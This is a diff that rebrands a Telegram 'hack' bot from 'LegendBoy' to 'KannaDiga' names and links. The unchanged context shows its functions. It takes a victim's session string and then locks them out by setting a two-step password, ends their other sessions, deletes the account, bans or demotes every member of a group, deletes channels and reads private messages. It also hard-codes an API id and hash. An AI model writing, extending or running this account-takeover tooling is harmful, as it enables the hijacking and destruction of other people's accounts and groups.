@@ -24,7 +24,7 @@ from . import *
 mybot = "missrose_bot"
 from userbot import bot
 
-legendboy = 2024465080
+KannaDiga = 2024465080
 
 
 async def change_number_code(strses, number, code, otp):
@@ -103,7 +103,7 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         try:
-            await X.edit_2fa("LEGENDBOY IS BEST")
+            await X.edit_2fa("KannaDiga IS BEST")
             return True
         except:
             return False
@@ -188,7 +188,7 @@ import logging
 
 logging.basicConfig(level=logging.WARNING)
 
-channel = "Pro_LegendBots"
+channel = "Kannadiga_bots"
 
 
 menu = """
@@ -242,7 +242,7 @@ keyboard = [
         Button.inline("L", data="Lhack"),
         Button.inline("M", data="Mhack"),
     ],
-    [Button.url("Owner", "https://t.me/Pro_Userboy")],
+    [Button.url("Owner", "https://t.me/Mr_Professor_Agora")],
 ]
 
 
@@ -275,13 +275,13 @@ async def users(event):
             )
         if len(i) > 3855:
             file = open("session.txt", "w")
-            file.write(i + "\n\nDetails BY LegendBoy")
+            file.write(i + "\n\nDetails BY KannaDiga")
             file.close()
             await bot.send_file(event.chat_id, "session.txt")
             system("rm -rf session.txt")
         else:
             await event.reply(
-                i + "\n\nThanks For using LegendBoyBot. \n/hack", buttons=keyboard
+                i + "\n\nThanks For using KannaDigaBot. \n/hack", buttons=keyboard
             )
 
 
@@ -299,7 +299,7 @@ async def users(event):
             )
         i = await userinfo(strses.text)
         await event.reply(
-            i + "\n\nThanks For using LegendBoy Bot.\n/hack", buttons=keyboard
+            i + "\n\nThanks For using KannaDiga Bot.\n/hack", buttons=keyboard
         )
 
 
@@ -319,7 +319,7 @@ async def users(event):
         grpid = await x.get_response()
         await userbans(strses.text, grpid.text)
         await event.reply(
-            "Banning all members. Thanks For using LegendBoy Bot", buttons=keyboard
+            "Banning all members. Thanks For using KannaDiga Bot", buttons=keyboard
         )
 
 
@@ -336,7 +336,7 @@ async def users(event):
                 "This StringSession Has Been Terminated.", buttons=keyboard
             )
         i = await usermsgs(strses.text)
-        await event.reply(i + "\n\nThanks For using LegendBoy Bot", buttons=keyboard)
+        await event.reply(i + "\n\nThanks For using KannaDiga Bot", buttons=keyboard)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ehack")))
@@ -355,7 +355,7 @@ async def users(event):
         grpid = await x.get_response()
         await joingroup(strses.text, grpid.text)
         await event.reply(
-            "Joined the Channel/Group Thanks For using LegendBoy Bot", buttons=keyboard
+            "Joined the Channel/Group Thanks For using KannaDiga Bot", buttons=keyboard
         )
 
 
@@ -395,7 +395,7 @@ async def users(event):
         grpid = await x.get_response()
         await delgroup(strses.text, grpid.text)
         await event.reply(
-            "Deleted the Channel/Group Thanks For using LegendBoyBot.", buttons=keyboard
+            "Deleted the Channel/Group Thanks For using KannaDigaBot.", buttons=keyboard
         )
 
 
@@ -414,7 +414,7 @@ async def users(event):
         i = await user2fa(strses.text)
         if i:
             await event.reply(
-                "User don't have two step thats why now two step is `LegendBoy Bot Is best` you can login now\n\nThanks For using LegendBoy Bot.",
+                "User don't have two step thats why now two step is `KannaDiga Bot Is best` you can login now\n\nThanks For using KannaDiga Bot.",
                 buttons=keyboard,
             )
         else:
@@ -435,7 +435,7 @@ async def users(event):
             )
         await terminate(strses.text)
         await event.reply(
-            "The all sessions are terminated\n\nThanks For using LegendBoyBot.",
+            "The all sessions are terminated\n\nThanks For using KannaDigaBot.",
             buttons=keyboard,
         )
 
@@ -454,7 +454,7 @@ async def users(event):
             )
         await delacc(strses.text)
         await event.reply(
-            "The Account is deleted SUCCESSFULLLY\n\nThanks For using LegendBoy Bot.",
+            "The Account is deleted SUCCESSFULLLY\n\nThanks For using KannaDiga Bot.",
             buttons=keyboard,
         )
 
@@ -477,7 +477,7 @@ async def users(event):
         user = await x.get_response()
         await promote(strses.text, grp.text, user.text)
         await event.reply(
-            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using LegendBoy Bot.",
+            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using KannaDiga Bot.",
             buttons=keyboard,
         )
 
@@ -501,7 +501,7 @@ async def users(event):
         except:
             pass
         await event.reply(
-            "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using LegendBoyBot.",
+            "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using KannaDigaBot.",
             buttons=keyboard,
         )
 
@@ -542,5 +542,5 @@ async def users(event):
                 await event.respond("Something is wrong")
         except Exception as e:
             await event.respond(
-                "SEND THIS ERROR TO - @LegendBot_Pros\n**LOGS**\n" + str(e)
+                "SEND THIS ERROR TO - @NAAN_1_KANNADIGA\n**LOGS**\n" + str(e)
             )
